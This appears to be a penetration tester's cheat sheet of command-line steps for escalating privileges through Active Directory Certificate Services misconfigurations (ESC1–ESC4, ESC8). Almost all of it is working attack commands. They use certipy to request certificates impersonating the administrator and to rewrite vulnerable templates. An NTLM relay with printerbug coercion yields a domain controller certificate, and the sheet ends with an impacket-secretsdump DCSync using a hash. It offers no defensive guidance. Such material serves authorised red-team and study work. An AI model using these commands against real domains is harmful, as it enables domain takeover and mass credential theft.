Highly Recommended Reference for ADCS attacks https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation

### ESC1 
#### Exploitation
- Linux
    ```bash
    certipy-ad account -u 'USERNAME' -p 'PASSWORD' -dc-ip 'DC_IP' -user 'administrator' read
    ```
    ```bash
    certipy-ad req \
        -u 'attacker@corp.local' -p 'Passw0rd!' \
        -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
        -ca 'CORP-CA' -template 'VulnTemplate' \
        -upn 'administrator@corp.local' -sid 'S-1-5-21-...-500'
    ```
    ```bash 
    certipy-ad auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
    ```

### ESC2
#### Exploitation
- Linux
    ```bash
    certipy req \
        -u 'attacker@corp.local' -p 'Passw0rd!' \
        -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
        -ca 'CORP-CA' -template 'AnyPurposeCert'
    ``` 
    ```bash
    certipy req \
        -u 'attacker@corp.local' -p 'Passw0rd!' \
        -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
        -ca 'CORP-CA' -template 'User' \
        -pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
    ```
    ```bash
    certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'  
    ```

### ESC3 (Very similar to ESC2 in exploitation)
#### Exploitation
- Linux
    ```bash
    certipy req \
        -u 'attacker@corp.local' -p 'Passw0rd!' \
        -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
        -ca 'CORP-CA' -template 'EnrollAgent'
    ```
    ```bash 
    certipy req \
        -u 'attacker@corp.local' -p 'Passw0rd!' \
        -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
        -ca 'CORP-CA' -template 'User' \
        -pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
    ```
    ```bash    
    certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
    ```
### ESC4
#### Exploitation
- Linux
    ```bash
    
    certipy template \
        -u 'attacker@corp.local' -p 'Passw0rd!' \
        -dc-ip '10.0.0.100' -template 'SecureFiles' \
        -write-default-configuration
    ```
    ```bash
    certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'SecureFiles' \
    -upn 'administrator@corp.local' -sid 'S-1-5-21-...-500'
    ```
    ```bash
    certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
    ```
    ```bash
    certipy template \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -template 'SecureFiles' \
    -write-configuration 'SecureFiles.json' -no-save
    ```

### ESC8
#### Exploitation
1. First set up the relay from our machine to the target http/https certsrv endpoint
    ```bash
    certipy relay  -target 'http://<target-ip>' -template 'DomainController'
    ```
2. Check available coersion methods using netexec smb `coerce_plus` module
    ```bash
    nxc smb taget.local -u 'myuser' -p 'passowrd123' -M coerce_plus
    ```
3. Coerce NTLM authentication to our Target machine (where we have the relay set up ready) - Ex. Using printerbug
    ```bash
    python3 /opt/AD/krbrelayx/printerbug.py 'target.local'/'myuser':'password123'@'<target-ip>' '<our-machine-ip>'
    ```
4. After this step, the relay should be getting us a .pfx for `dc0$`, we can then use it for Pass-the-certificate and get TGT
    ```bash
    certipy auth -pfx 'dc01$.pfx' -dc-ip 10.10.10.11
    ```
5. Lastly we can do DCSync using the NT Hash for the DC01$ account
    ```bash
    impacket-secretsdump 'target.local/dc01$@dc01.target.local' -hashes aad3b435b51404eeaad3b435b51404ee:57867e655d1abc9f45fd6e954e351531  -no-pass -dc-ip 10.10.31.81
    ```
